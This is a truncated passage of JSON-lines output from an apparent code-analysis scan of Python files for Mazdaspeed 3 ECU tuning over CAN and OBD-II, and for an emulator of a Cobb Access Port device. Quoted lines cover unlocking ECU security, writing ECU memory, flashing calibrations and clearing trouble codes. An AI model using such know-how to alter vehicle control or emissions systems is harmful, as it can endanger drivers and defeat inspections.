MZRCANProtocol"}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "parser.add_argument('--interface', default='vcan0', help='CAN interface name')"}, {"type": "protocol", "line": 27, "protocol": "CAN", "content": "print(\"[*] Initializing CAN protocol...\")"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "can_protocol = MZRCANProtocol(channel=args.interface)"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "Complete deployment-ready system for ECU tuning and diagnostics"}, {"type": "hardware", "line": 14, "hardware": "ECU", "content": "from ecu.mzr_disaster import MZRECU"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "ecu = MZRECU(can_protocol)"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "print(\"[*] Unlocking ECU security...\")"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "if can_protocol.unlock_ecu(can_protocol.TUNING_LEVEL):"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "print(\"[+] ECU unlocked successfully\")"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "print(\"[-] ECU unlock failed\")"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "print(\"[*] Scanning ECU identification...\")"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "ident = can_protocol.read_ecu_identification()"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "calibration_dump = ecu.dump_full_calibration()"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "editor = MapEditor3D(ecu)"}, {"type": "hardware", "line": 73, "hardware": "ECU", "content": "if editor.save_table_to_ecu():"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "print(\"[+] Table modifications written to ECU\")"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "print(\"[-] Failed to write table to ECU\")"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "tuner = RealTimeTuner(ecu)"}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "rpm = ecu.read_realtime_parameter('ENGINE_RPM')"}, {"type": "hardware", "line": 89, "hardware": "ECU", "content": "boost = ecu.read_realtime_parameter('MANIFOLD_PRESSURE')"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "timing = ecu.read_realtime_parameter('IGNITION_TIMING')"}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "knock = ecu.read_realtime_parameter('KNOCK_RETARD')"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "if ecu.flash_calibration_file(args.file):"}], "security_logic": [{"type": "security_pattern", "line": 45, "pattern": "key", "content": "for key, value in ident.items():"}, {"type": "security_pattern", "line": 46, "pattern": "key", "content": "print(f\"    {key}: {value}\")"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb5.py", "lines_read": 216, "features_found": [{"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "create_virtual_device", "line": 56}, {"type": "function", "name": "_start_message_processor", "line": 83}, {"type": "function", "name": "_message_loop", "line": 89}, {"type": "function", "name": "_handle_identify", "line": 105}, {"type": "function", "name": "_handle_ecu_connect", "line": 114}, {"type": "function", "name": "_handle_read_memory", "line": 126}, {"type": "function", "name": "_handle_write_memory", "line": 138}, {"type": "function", "name": "_handle_flash_begin", "line": 149}, {"type": "function", "name": "_handle_flash_data", "line": 157}, {"type": "function", "name": "_handle_flash_end", "line": 168}, {"type": "function", "name": "_handle_realtime_data", "line": 179}, {"type": "function", "name": "send_usb_message", "line": 198}, {"type": "function", "name": "disconnect", "line": 212}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "usb.core", "line": null}, {"type": "import", "module": "usb.util", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "CobbDeviceState", "line": 16}, {"type": "class", "name": "CobbAccessPortEmulator", "line": 23}], "algorithms": [], "protocols": [{"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER = 0x01"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "NORMAL = 0x02"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "FLASHING = 0x03"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "DIAGNOSTIC = 0x04"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "VENDOR_ID = 0x16C0"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "PRODUCT_ID = 0x05DC"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "EP_IN = 0x81"}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "EP_OUT = 0x01"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: self._handle_identify,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: self._handle_ecu_connect,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: self._handle_read_memory,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: self._handle_write_memory,"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "0x14: self._handle_flash_begin,"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "0x15: self._handle_flash_data,"}, {"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "0x16: self._handle_flash_end,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "0x17: self._handle_realtime_data"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "0x90,  # Response ID"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x91, 0x01)  # Success"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<B', 0x92) + fake_data"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x93, 0x01 if success else 0x00)"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x94, 0x01)  # Ready for flash"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BBH', 0x95, 0x01, block_number)  # ACK"}, {"type": "protocol", "line": 176, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x96, 0x01 if success else 0x00)"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BHHHHH', 0x97,"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "self.ecu_connected = False"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "0x11: self._handle_ecu_connect,"}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "def _handle_ecu_connect(self, data: bytes) -> bytes:"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "\"\"\"Handle ECU connection request\"\"\""}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "self.ecu_connected = True"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "self.ecu_connected = False"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb6.py", "lines_read": 181, "features_found": [{"type": "function", "name": "__init__", "line": 21}, {"type": "function", "name": "connect_usb", "line": 26}, {"type": "function", "name": "connect_serial", "line": 58}, {"type": "function", "name": "connect_ethernet", "line": 76}, {"type": "function", "name": "send_command", "line": 89}, {"type": "function", "name": "identify_device", "line": 124}, {"type": "function", "name": "ecu_connect", "line": 144}, {"type": "function", "name": "read_ecu_memory", "line": 151}, {"type": "function", "name": "write_ecu_memory", "line": 161}, {"type": "function", "name": "disconnect", "line": 168}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".cobb_emulator", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "select", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "usb.core", "line": null}, {"type": "import", "module": "usb.backend.libusb1", "line": null}, {"type": "import", "module": "CobbAccessPortEmulator", "line": null}], "components_found": [{"type": "class", "name": "HardwareInterface", "line": 15}], "algorithms": [], "protocols": [{"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "def connect_usb(self, vendor_id: int = 0x16C0, product_id: int = 0x05DC) -> bool:"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "written = self.connection.write(0x01, command, timeout=1000)"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.connection.read(0x81, 64, timeout=1000)"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "connect_cmd = struct.pack('<BBI', 0x11, protocol, baudrate)"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "return response and response[1] == 0x01"}, {"type": "protocol", "line": 153, "protocol": "0x[0-9A-Fa-f]+", "content": "read_cmd = struct.pack('<BIB', 0x12, address, length)"}, {"type": "protocol", "line": 156, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x92:"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "write_cmd = struct.pack('<BI', 0x13, address) + data"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "return response and response[1] == 0x01"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 6, "hardware": "ABS", "content": "Abstracts communication with physical/virtual Cobb AP hardware"}, {"type": "hardware", "line": 144, "hardware": "ECU", "content": "def ecu_connect(self, protocol: int = 6, baudrate: int = 500000) -> bool:"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "\"\"\"Connect to ECU through hardware interface\"\"\""}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "def read_ecu_memory(self, address: int, length: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "\"\"\"Read ECU memory through hardware interface\"\"\""}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "def write_ecu_memory(self, address: int, data: bytes) -> bool:"}, {"type": "hardware", "line": 162, "hardware": "ECU", "content": "\"\"\"Write ECU memory through hardware interface\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb7.py", "lines_read": 201, "features_found": [{"type": "function", "name": "__init__", "line": 54}, {"type": "function", "name": "connect_obd", "line": 58}, {"type": "function", "name": "read_pid", "line": 74}, {"type": "function", "name": "_parse_pid_response", "line": 99}, {"type": "function", "name": "read_dtc", "line": 143}, {"type": "function", "name": "_parse_dtc_bytes", "line": 163}, {"type": "function", "name": "clear_dtc", "line": 177}, {"type": "function", "name": "read_all_realtime_data", "line": 185}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "OBD2Protocol", "line": 10}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "OBD", "content": "OBD-II Protocol Implementation for Mazdaspeed 3"}, {"type": "protocol", "line": 3, "protocol": "OBD", "content": "Provides standard OBD-II functionality alongside Cobb-specific features"}, {"type": "protocol", "line": 10, "protocol": "OBD", "content": "class OBD2Protocol:"}, {"type": "protocol", "line": 12, "protocol": "OBD", "content": "OBD-II protocol implementation with Mazdaspeed 3 extensions"}, {"type": "protocol", "line": 13, "protocol": "PID", "content": "Supports standard PIDs and Mazda-specific proprietary PIDs"}, {"type": "protocol", "line": 17, "protocol": "PID", "content": "STANDARD_PIDS = {"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "0x00: \"PIDs supported [01-20]\","}, {"type": "protocol", "line": 18, "protocol": "PID", "content": "0x00: \"PIDs supported [01-20]\","}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: \"Calculated engine load\","}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: \"Engine coolant temperature\","}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: \"Engine RPM\","}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: \"Vehicle speed\","}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: \"Intake air temperature\","}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: \"Throttle position\","}, {"type": "protocol", "line": 25, "protocol": "OBD", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "0x21: \"Distance traveled with MIL on\""}, {"type": "protocol", "line": 30, "protocol": "PID", "content": "MAZDA_PIDS = {"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "0x01: \"Boost pressure (actual)\","}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "0x02: \"Boost pressure (target)\","}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "0x03: \"Wastegate duty cycle\","}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "0x04: \"VVT intake actual\","}, {"type": "protocol", "line": 35, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: \"VVT intake target\","}, {"type": "protocol", "line": 36, "protocol": "0x[0-9A-Fa-f]+", "content": "0x06: \"VVT exhaust actual\","}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "0x07: \"VVT exhaust target\","}, {"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "0x08: \"Knock retard cylinder 1\","}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "0x09: \"Knock retard cylinder 2\","}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0A: \"Knock retard cylinder 3\","}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0B: \"Knock retard cylinder 4\","}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0C: \"Fuel final base\","}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0D: \"Fuel final correction\","}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0E: \"Ignition base timing\","}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0F: \"Ignition correction\","}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: \"MAF voltage\","}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: \"MAF g/s\","}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: \"Injector pulse width\","}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: \"Fuel pump duty cycle\","}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "0x14: \"EGT bank 1\","}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "0x15: \"EGT bank 2\""}, {"type": "protocol", "line": 59, "protocol": "OBD", "content": "\"\"\"Initialize OBD-II connection\"\"\""}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x81, 0x13, 0xF1, 0x81]),  # Start communication"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x03]),  # Set protocol"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, cmd)"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "def read_pid(self, pid: int, mode: int = 0x01) -> Optional[float]:"}, {"type": "protocol", "line": 76, "protocol": "OBD", "content": "Read OBD-II PID value"}, {"type": "protocol", "line": 76, "protocol": "PID", "content": "Read OBD-II PID value"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "mode 0x01 = Show current data"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "mode 0x22 = Read data by identifier (proprietary)"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01 and pid not in self.STANDARD_PIDS:"}, {"type": "protocol", "line": 80, "protocol": "PID", "content": "if mode == 0x01 and pid not in self.STANDARD_PIDS:"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x22 and pid not in self.MAZDA_PIDS:"}, {"type": "protocol", "line": 82, "protocol": "PID", "content": "if mode == 0x22 and pid not in self.MAZDA_PIDS:"}, {"type": "protocol", "line": 86, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01:"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "request = bytes([mode, pid >> 8, pid & 0xFF])"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, request)"}, {"type": "protocol", "line": 100, "protocol": "OBD", "content": "\"\"\"Parse OBD response data into engineering units\"\"\""}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "if mode == 0x01:"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid == 0x04:  # Engine load"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x05:  # Coolant temp"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0C:  # Engine RPM"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0D:  # Vehicle speed"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0F:  # Intake air temp"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x11:  # Throttle position"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "elif mode == 0x22:"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid in [0x01, 0x02]:  # Boost pressure"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x03:  # Wastegate duty"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x04, 0x05, 0x06, 0x07]:  # VVT"}, {"type": "protocol", "line": 124, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in range(0x08, 0x0C):  # Knock retard"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x0C, 0x0D]:  # Fuel"}, {"type": "protocol", "line": 128, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x0E, 0x0F]:  # Ignition"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x10:  # MAF voltage"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x11:  # MAF g/s"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x12:  # Injector pulse"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x13:  # Fuel pump duty"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid in [0x14, 0x15]:  # EGT"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_cmd = bytes([0x03])  # Read DTCs"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, dtc_cmd)"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "first_char = (byte1 >> 6) & 0x03"}, {"type": "protocol", "line": 167, "protocol": "0x[0-9A-Fa-f]+", "content": "second_char = (byte1 >> 4) & 0x03"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "code1 = byte1 & 0x0F"}, {"type": "protocol", "line": 169, "protocol": "0x[0-9A-Fa-f]+", "content": "code2 = (byte2 >> 4) & 0x0F"}, {"type": "protocol", "line": 170, "protocol": "0x[0-9A-Fa-f]+", "content": "code3 = byte2 & 0x0F"}, {"type": "protocol", "line": 179, "protocol": "0x[0-9A-Fa-f]+", "content": "clear_cmd = bytes([0x04])  # Clear DTCs"}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can.send_can_message(0x7E0, clear_cmd)"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x44"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "for pid in [0x04, 0x05, 0x0C, 0x0D, 0x0F, 0x11]:"}, {"type": "protocol", "line": 191, "protocol": "0x[0-9A-Fa-f]+", "content": "value = self.read_pid(pid, 0x01)"}, {"type": "protocol", "line": 193, "protocol": "PID", "content": "data[self.STANDARD_PIDS[pid]] = value"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "for pid in range(0x01, 0x16):"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "value = self.read_pid(pid, 0x22)"}, {"type": "protocol", "line": 199, "protocol": "PID", "content": "data[self.MAZDA_PIDS[pid]] = value"}], "hardware_assumptions": [{"type": "hardware", "line": 22, "hardware": "vehicle", "content": "0x0D: \"Vehicle speed\","}, {"type": "hardware", "line": 25, "hardware": "vehicle", "content": "0x1C: \"OBD standards this vehicle conforms to\","}, {"type": "hardware", "line": 109, "hardware": "vehicle", "content": "elif pid == 0x0D:  # Vehicle speed"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb8.py", "lines_read": 213, "features_found": [{"type": "function", "name": "__init__", "line": 34}, {"type": "function", "name": "create_virtual_device", "line": 53}, {"type": "function", "name": "_start_message_processor", "line": 80}, {"type": "function", "name": "_message_loop", "line": 86}, {"type": "function", "name": "_handle_identify", "line": 102}, {"type": "function", "name": "_handle_ecu_connect", "line": 111}, {"type": "function", "name": "_handle_read_memory", "line": 123}, {"type": "function", "name": "_handle_write_memory", "line": 135}, {"type": "function", "name": "_handle_flash_begin", "line": 146}, {"type": "function", "name": "_handle_flash_data", "line": 154}, {"type": "function", "name": "_handle_flash_end", "line": 165}, {"type": "function", "name": "_handle_realtime_data", "line": 176}, {"type": "function", "name": "send_usb_message", "line": 195}, {"type": "function", "name": "disconnect", "line": 209}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "usb.core", "line": null}, {"type": "import", "module": "usb.util", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "CobbDeviceState", "line": 13}, {"type": "class", "name": "CobbAccessPortEmulator", "line": 20}], "algorithms": [], "protocols": [{"type": "protocol", "line": 15, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOTLOADER = 0x01"}, {"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "NORMAL = 0x02"}, {"type": "protocol", "line": 17, "protocol": "0x[0-9A-Fa-f]+", "content": "FLASHING = 0x03"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "DIAGNOSTIC = 0x04"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "VENDOR_ID = 0x16C0"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "PRODUCT_ID = 0x05DC"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "EP_IN = 0x81"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "EP_OUT = 0x01"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: self._handle_identify,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: self._handle_ecu_connect,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: self._handle_read_memory,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: self._handle_write_memory,"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "0x14: self._handle_flash_begin,"}, {"type": "protocol", "line": 48, "protocol": "0x[0-9A-Fa-f]+", "content": "0x15: self._handle_flash_data,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "0x16: self._handle_flash_end,"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "0x17: self._handle_realtime_data"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "0x90,  # Response ID"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x91, 0x01)  # Success"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<B', 0x92) + fake_data"}, {"type": "protocol", "line": 143, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x93, 0x01 if success else 0x00)"}, {"type": "protocol", "line": 151, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x94, 0x01)  # Ready for flash"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BBH', 0x95, 0x01, block_number)  # ACK"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BB', 0x96, 0x01 if success else 0x00)"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "response = struct.pack('<BHHHHH', 0x97,"}], "hardware_assumptions": [{"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.ecu_connected = False"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "0x11: self._handle_ecu_connect,"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "def _handle_ecu_connect(self, data: bytes) -> bytes:"}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "\"\"\"Handle ECU connection request\"\"\""}, {"type": "hardware", "line": 117, "hardware": "ECU", "content": "self.ecu_connected = True"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "self.ecu_connected = False"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["cobb"]}
{"file_path": "cobb9.py", "lines_read": 177, "features_found": [{"type": "function", "name": "__init__", "line": 17}, {"type": "function", "name": "connect_usb", "line": 22}, {"type": "function", "name": "connect_serial", "line": 54}, {"type": "function", "name": "connect_ethernet", "line": 72}, {"type": "function", "name": "send_command", "line": 85}, {"type": "function", "name": "identify_device", "line": 120}, {"type": "function", "name": "ecu_connect", "line": 140}, {"type": "function", "name": "read_ecu_memory", "line": 147}, {"type": "function", "name": "write_ecu_memory", "line": 157}, {"type": "function", "name": "disconnect", "line": 164}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".cobb_emulator", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "socket", "line": null}, {"type": "import", "module": "select", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "usb.core", "line": null}, {"type": "import", "module": "usb.backend.libusb1", "line": null}, {"type": "import", "module": "CobbAccessPortEmulator", "line": null}], "components_found": [{"type": "class", "name": "HardwareInterface", "line": 11}], "algorithms": [], "protocols": [{"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "def 